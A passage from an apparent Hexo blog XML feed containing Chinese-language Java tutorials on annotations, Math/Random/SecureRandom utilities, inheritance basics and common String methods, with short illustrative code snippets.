class="hljs-string">&quot;sfds&quot;</span>,<span class="hljs-string">&quot;dsfdfs&quot;</span>&#125;;<br>&#125;<br><br><br><br><span class="hljs-comment">/*=====================================================*/</span><br><span class="hljs-comment">//参数没有顺序</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/3 18:03</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">interfaceTest</span> </span>&#123;<br>    <span class="hljs-meta">@myin(name=&#123;&quot;dfwef&quot;,&quot;dfwef&quot;&#125;,age = 23,fir = &quot;234324&quot;)</span> <span class="hljs-comment">//位置任意写</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> dragonone</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Target(&#123;ElementType.TYPE,ElementType.METHOD&#125;)</span> <span class="hljs-comment">//可以作用于类、方法</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span> <span class="hljs-comment">//在运行时</span><br><span class="hljs-meta">@interface</span> myin&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">age</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">String <span class="hljs-title">fir</span><span class="hljs-params">()</span></span>;<br>    String[] name() <span class="hljs-keyword">default</span> &#123;<span class="hljs-string">&quot;sfds&quot;</span>,<span class="hljs-string">&quot;dsfdfs&quot;</span>&#125;;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-JAVA常用工具类</title>
    <link href="/2021/08/01/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-JAVA%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%B1%BB/"/>
    <url>/2021/08/01/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-JAVA%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-Math"><a href="#1-Math" class="headerlink" title="1.Math"></a>1.Math</h2><blockquote><ol><li>求绝对值</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> a = -<span class="hljs-number">123</span>;<br>System.out.println(Math.abs(a)); <span class="hljs-comment">// 123</span><br><br><span class="hljs-comment">//位运算。取反加1</span><br><span class="hljs-keyword">int</span> a = -<span class="hljs-number">1234</span>;<br><span class="hljs-keyword">int</span> b = ~a+<span class="hljs-number">1</span>;<br>System.out.println(b);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>取最大或最小值</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> a = <span class="hljs-number">123</span>;<br><span class="hljs-keyword">int</span> b = <span class="hljs-number">456</span>;<br><span class="hljs-keyword">int</span> m = Math.max(a,b);<br><span class="hljs-keyword">int</span> mi = Math.min(a,b);<br>System.out.println(m);<br>System.out.println(mi);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>计算x的y次方</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Math.pow(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>); <span class="hljs-comment">// 2的10次方=1024</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>计算√x</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Math.sqrt(<span class="hljs-number">2</span>);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>计算e的x次方</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Math.exp(<span class="hljs-number">2</span>);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>计算以e为底的对数</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Math.log(<span class="hljs-number">4</span>);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="7"><li>计算以10为底的对数</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Math.log10(<span class="hljs-number">100</span>);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="8"><li>三角函数</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Math.sin(<span class="hljs-number">3.14</span>); <span class="hljs-comment">// 0.00159...</span><br>Math.cos(<span class="hljs-number">3.14</span>); <span class="hljs-comment">// -0.9999...</span><br>Math.tan(<span class="hljs-number">3.14</span>); <span class="hljs-comment">// -0.0015...</span><br>Math.asin(<span class="hljs-number">1.0</span>); <span class="hljs-comment">// 1.57079...</span><br>Math.acos(<span class="hljs-number">1.0</span>); <span class="hljs-comment">// 0.0</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="9"><li>数学常量</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span> pi = Math.PI; <span class="hljs-comment">// 3.14159...</span><br><span class="hljs-keyword">double</span> e = Math.E; <span class="hljs-comment">// 2.7182818...</span><br>Math.sin(Math.PI / <span class="hljs-number">6</span>); <span class="hljs-comment">// sin(π/6) = 0.5</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="10"><li>随机数</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Math.random(); <span class="hljs-comment">// 0.53907... 每次都不一样</span><br></code></pre></div></td></tr></table></figure><h2 id="2-Random"><a href="#2-Random" class="headerlink" title="2.Random"></a>2.Random</h2><p>Random用来创建伪随机数。<br>要生成一个随机数，可以使用nextInt()、nextLong()、nextFloat()、nextDouble()。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Random r = <span class="hljs-keyword">new</span> Random();<br>r.nextInt(); <span class="hljs-comment">// 2071575453,每次都不一样</span><br>r.nextInt(<span class="hljs-number">10</span>); <span class="hljs-comment">// 5,生成一个[0,10)之间的int</span><br>r.nextInt()%<span class="hljs-number">10</span>; <span class="hljs-comment">// 生成-10到10的数</span><br><br>r.nextLong(); <span class="hljs-comment">// 8811649292570369305,每次都不一样，不支持r.nextLong(10)这种写法</span><br>r.nextLong()%<span class="hljs-number">10</span>; <span class="hljs-comment">// 生成-10到10的数</span><br><br>r.nextFloat(); <span class="hljs-comment">// 0.54335...生成一个[0,1)之间的float</span><br>r.nextDouble(); <span class="hljs-comment">// 0.3716...生成一个[0,1)之间的double</span><br></code></pre></div></td></tr></table></figure><h2 id="3-SecureRandom"><a href="#3-SecureRandom" class="headerlink" title="3.SecureRandom"></a>3.SecureRandom</h2><p>有伪随机数，就有真随机数。实际上真正的真随机数只能通过量子力学原理来获取，而我们想要的是一个不可预测的安全的随机数，SecureRandom就是用来创建安全的随机数的。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">SecureRandom sr = <span class="hljs-keyword">new</span> SecureRandom();<br>System.out.println(sr.nextInt(<span class="hljs-number">100</span>));<br></code></pre></div></td></tr></table></figure><p>SecureRandom无法指定种子，它使用RNG（random number generator）算法。JDK的SecureRandom实际上有多种不同的底层实现，有的使用安全随机种子加上伪随机数算法来产生安全的随机数，有的使用真正的随机数生成器。实际使用的时候，可以优先获取高强度的安全随机数生成器，如果没有提供，再使用普通等级的安全随机数生成器。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.security.SecureRandom;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        SecureRandom sr = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            sr = SecureRandom.getInstanceStrong(); <span class="hljs-comment">// 获取高强度安全随机数生成器</span><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchAlgorithmException e) &#123;<br>            sr = <span class="hljs-keyword">new</span> SecureRandom(); <span class="hljs-comment">// 获取普通的安全随机数生成器</span><br>        &#125;<br>        <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">16</span>];<br>        sr.nextBytes(buffer); <span class="hljs-comment">// 用安全随机数填充buffer</span><br>        System.out.println(Arrays.toString(buffer));;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>SecureRandom的安全性是通过操作系统提供的安全的随机种子来生成随机数。这个种子是通过CPU的热噪声、读写磁盘的字节、网络流量等各种随机事件产生的“熵”。</p><p>在密码学中，安全的随机数非常重要。如果使用不安全的伪随机数，所有加密体系都将被攻破。因此，时刻牢记必须使用SecureRandom来产生安全的随机数。</p>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识快速复习（一）</title>
    <link href="/2021/08/01/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%BF%AB%E9%80%9F%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/08/01/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%BF%AB%E9%80%9F%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识快速复习（一）。包括数组的基本操作、三大特性、字符串及其有关的操作。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-遍历数组"><a href="#1-遍历数组" class="headerlink" title="1.遍历数组"></a>1.遍历数组</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] ns = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>, <span class="hljs-number">25</span> &#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;ns.length; i++) &#123;<br>  <span class="hljs-keyword">int</span> n = ns[i];<br>  System.out.println(n);<br>&#125;<br><br><span class="hljs-comment">// 加强for</span><br><span class="hljs-keyword">int</span>[] ns = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>, <span class="hljs-number">25</span> &#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> n : ns) &#123;<br>System.out.println(n);<br>&#125;<br><span class="hljs-comment">//在for (int n : ns)循环中，变量n直接拿到ns数组的元素，而不是索引。</span><br><br><span class="hljs-comment">// Arrays.toString()</span><br><span class="hljs-keyword">int</span>[] ns = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span> &#125;;<br>System.out.println(Arrays.toString(ns));<br></code></pre></div></td></tr></table></figure><h2 id="2-封装、继承、多态"><a href="#2-封装、继承、多态" class="headerlink" title="2.封装、继承、多态"></a>2.封装、继承、多态</h2><blockquote><ol><li>子类自动获得了父类的所有字段，不能定义与父类重名的字段！在OOP的术语中，我们把Person称为超类（super class），父类（parent class），基类（base class），把Student称为子类（subclass），扩展类（extended class）。</li></ol></blockquote><blockquote><ol start="2"><li>Java只允许一个class继承自一个类，因此，一个类有且仅有一个父类。只有Object特殊，它没有父类。</li></ol></blockquote><blockquote><ol start="3"><li>super关键字表示父类（超类）。任何class的构造方法，第一行语句必须是调用父类的构造方法。如果没有明确地调用父类的构造方法，编译器会帮我们自动加一句super();子类不会继承任何父类的构造方法。子类默认的构造方法是编译器自动生成的，不是继承的。</li></ol></blockquote><blockquote><ol start="4"><li>Override和Overload不同的是，如果方法签名不同，就是Overload，Overload方法是一个新方法；如果方法签名相同，并且返回值也相同，就是Override。继承可以允许子类覆写父类的方法。如果一个父类不允许子类对它的某个方法进行覆写，可以把该方法标记为final。用final修饰的方法不能被Override。</li></ol></blockquote><blockquote><ol start="5"><li>如果一个class定义了方法，但没有具体执行代码，这个方法就是抽象方法，抽象方法用abstract修饰。因为无法执行抽象方法，因此这个类也必须申明为抽象类，使用abstract修饰。无法实例化一个抽象类。</li></ol></blockquote><blockquote><ol start="6"><li>一个interface可以继承自另一个interface。interface继承自interface使用extends，它相当于扩展了接口的方法。在接口中，可以定义default方法。实现类可以不必覆写default方法。default方法的目的是，当我们需要给接口新增一个方法时，会涉及到修改全部子类。如果新增的是default方法，那么子类就不必全部修改，只需要在需要覆写的地方去覆写新增方法。</li></ol></blockquote><h3 id="2-1-阻止继承"><a href="#2-1-阻止继承" class="headerlink" title="2.1 阻止继承"></a>2.1 阻止继承</h3><p>正常情况下，只要某个class没有final修饰符，那么任何类都可以从该class继承。从Java 15开始，允许使用<code>sealed</code>修饰class，并通过<code>permits</code>明确写出能够从该class继承的子类名称。这种<code>sealed</code>类主要用于一些框架，防止继承被滥用。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//定义一个Shape类：</span><br><span class="hljs-keyword">public</span> sealed <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shape</span> <span class="hljs-title">permits</span> <span class="hljs-title">Rect</span>, <span class="hljs-title">Circle</span>, <span class="hljs-title">Triangle</span> </span>&#123;<br>    ...<br>&#125;<br><br><span class="hljs-comment">//Shape类就是一个sealed类，它只允许指定的3个类继承它。</span><br></code></pre></div></td></tr></table></figure><h2 id="3-字符串"><a href="#3-字符串" class="headerlink" title="3.字符串"></a>3.字符串</h2><p>Java字符串String是不可变对象。字符串操作不改变原字符串内容，而是返回新字符串。</p><h3 id="3-1-字符串比较"><a href="#3-1-字符串比较" class="headerlink" title="3.1 字符串比较"></a>3.1 字符串比较</h3><blockquote><ol><li>两个字符串比较，总是使用equals()方法。== 比较的是两个的地址。</li></ol></blockquote><blockquote><ol start="2"><li>忽略大小写比较（<code>equalsIgnoreCase()</code>）</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s1=<span class="hljs-string">&quot;abcdefghijklmnopkrstuvwxyz&quot;</span><br>String s2=<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPKRSTUVWXYZ&quot;</span><br><span class="hljs-keyword">boolean</span> flag=s1.equalsIgnoreCase(s2)<br></code></pre></div></td></tr></table></figure><h3 id="3-2-查找子串"><a href="#3-2-查找子串" class="headerlink" title="3.2 查找子串"></a>3.2 查找子串</h3><ul><li><ol><li>是否包含子串（<code>contains()</code>）</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;abcdefghijklmnopkrstuvwxyz&quot;</span>;<br>System.out.println(s.contains(<span class="hljs-string">&quot;bc&quot;</span>));<br>System.out.println(s.contains(<span class="hljs-string">&quot;bd&quot;</span>));<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">false</span><br></code></pre></div></td></tr></table></figure><ul><li><ol start="2"><li>查看子串是否在母串的开始（<code>startsWith()</code>）</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;abcdefghijklmnopkrstuvwxyz&quot;</span>;<br>System.out.println(s.startsWith(<span class="hljs-string">&quot;abc&quot;</span>));<br>System.out.println(s.startsWith(<span class="hljs-string">&quot;bcd&quot;</span>));<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">false</span><br></code></pre></div></td></tr></table></figure><ul><li><ol start="3"><li>查看子串是否在母串的最后（<code>endsWith()</code>）</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;abcdefghijklmnopkrstuvwxyz&quot;</span>;<br>System.out.println(s.endsWith(<span class="hljs-string">&quot;wxy&quot;</span>));<br>System.out.println(s.endsWith(<span class="hljs-string">&quot;xyz&quot;</span>));<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">true</span><br></code></pre></div></td></tr></table></figure><ul><li><ol start="4"><li>找子串第一次出现的下标，从下标0开始（<code>indexOf()</code>），没有找到返回-1</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;abcdabcedaaq&quot;</span>;<br>System.out.println(s.indexOf(<span class="hljs-string">&quot;bc&quot;</span>));<br>System.out.println(s.indexOf(<span class="hljs-string">&quot;fgh&quot;</span>));<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-number">1</span><br>-<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><ul><li><ol start="5"><li>找子串最后一次出现的下标（<code>lastIndexOf()</code>）</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;abcdbcq&quot;</span>;<br>System.out.println(s.lastIndexOf(<span class="hljs-string">&quot;bc&quot;</span>));<br>System.out.println(s.lastIndexOf(<span class="hljs-string">&quot;fgh&quot;</span>));<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-number">4</span><br>-<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><ul><li><ol start="6"><li>提取子串（<code>substring()</code>）</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;abbcccdddd&quot;</span>;<br>System.out.println(s.substring(<span class="hljs-number">2</span>)); <span class="hljs-comment">//从下标2开始</span><br>System.out.println(s.substring(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)); <span class="hljs-comment">//从下标1到下标5（不包括5），即[1,5)</span><br><br><span class="hljs-comment">//输出</span><br>bcccdddd<br>bbcc<br></code></pre></div></td></tr></table></figure><h3 id="3-3-去除首位空白字符"><a href="#3-3-去除首位空白字符" class="headerlink" title="3.3 去除首位空白字符"></a>3.3 去除首位空白字符</h3><ul><li><ol><li>去除字符串首尾空白字符（<code>trim()</code>）。空白字符包括空格，<code>\t，\r，\n</code>：</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;  fw few ewf we  q qwf &quot;</span>;<br>System.out.println(s.length());<br>System.out.println(s);<br>s = s.trim();<br>System.out.println(s.length());<br>System.out.println(s);<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-number">23</span><br>  fw few ewf we  q qwf . <span class="hljs-comment">//！！！并没有点号，只是为了方便看尾部的空格才手动加上的</span><br><span class="hljs-number">20</span><br>fw few ewf we  q qwf.<br><br><br><span class="hljs-string">&quot;  \tHello\r\n &quot;</span>.trim(); <span class="hljs-comment">// &quot;Hello&quot;</span><br></code></pre></div></td></tr></table></figure><ul><li><ol start="2"><li>移除字符串首尾空白字符（<code>strip()</code>）。它和<code>trim()</code>不同的是，类似中文的空格字符\u3000也会被移除。</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-string">&quot;\u3000Hello\u3000&quot;</span>.strip(); <span class="hljs-comment">// &quot;Hello&quot;。</span><br><span class="hljs-string">&quot; Hello &quot;</span>.stripLeading(); <span class="hljs-comment">// &quot;Hello &quot;。移除字符串首部的空白符</span><br><span class="hljs-string">&quot; Hello &quot;</span>.stripTrailing(); <span class="hljs-comment">// &quot; Hello&quot;。移除字符串尾部的空白符</span><br></code></pre></div></td></tr></table></figure><h3 id="3-4-判断字符串"><a href="#3-4-判断字符串" class="headerlink" title="3.4 判断字符串"></a>3.4 判断字符串</h3><p>判断字符串是否为 空（<code>isEmpty()</code>）和空白字符串（<code>isBlank()</code>）</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-string">&quot;&quot;</span>.isEmpty(); <span class="hljs-comment">// true，因为字符串长度为0</span><br><span class="hljs-string">&quot;  &quot;</span>.isEmpty(); <span class="hljs-comment">// false，因为字符串长度不为0</span><br><span class="hljs-string">&quot;  \n&quot;</span>.isBlank(); <span class="hljs-comment">// true，因为只包含空白字符</span><br><span class="hljs-string">&quot; Hello &quot;</span>.isBlank(); <span class="hljs-comment">// false，因为包含非空白字符</span><br></code></pre></div></td></tr></table></figure><h3 id="3-5-替换"><a href="#3-5-替换" class="headerlink" title="3.5 替换"></a>3.5 替换</h3><p>替换子串（<code>replace()</code>），返回一个新字符串。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;abcbabca&quot;</span>;<br>String s1 = s.replace(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>);<span class="hljs-comment">//tbcbtbct，所有的字符a都被替换为t</span><br>String s1 = s.replace(<span class="hljs-string">&quot;ab&quot;</span>,<span class="hljs-string">&quot;tttt&quot;</span>); <span class="hljs-comment">//ttttcbttttca，所有的子串ab都被替换为tttt</span><br></code></pre></div></td></tr></table></figure><p>正则表达式替换：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;A,,B;C ,D&quot;</span>;<br>s.replaceAll(<span class="hljs-string">&quot;[\\,\\;\\s]+&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>); <span class="hljs-comment">// &quot;A,B,C,D&quot;，把匹配的子串统一替换为&quot;,&quot;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-6-分割字符串"><a href="#3-6-分割字符串" class="headerlink" title="3.6 分割字符串"></a>3.6 分割字符串</h3><p>split()，其中表达式就是一个正则表达式。返回的是一个字符串数组。</p><blockquote><ol start="0"><li>特殊情况（斜线<code>\</code>）</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;ab\\cd\\ef\\g\\h&quot;</span>;<br>String[] s1 = s.split(<span class="hljs-string">&quot;\\\\&quot;</span>); <span class="hljs-comment">//以 \ 为分割线</span><br>System.out.println(s);<br><span class="hljs-keyword">int</span> len=s1.length;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span 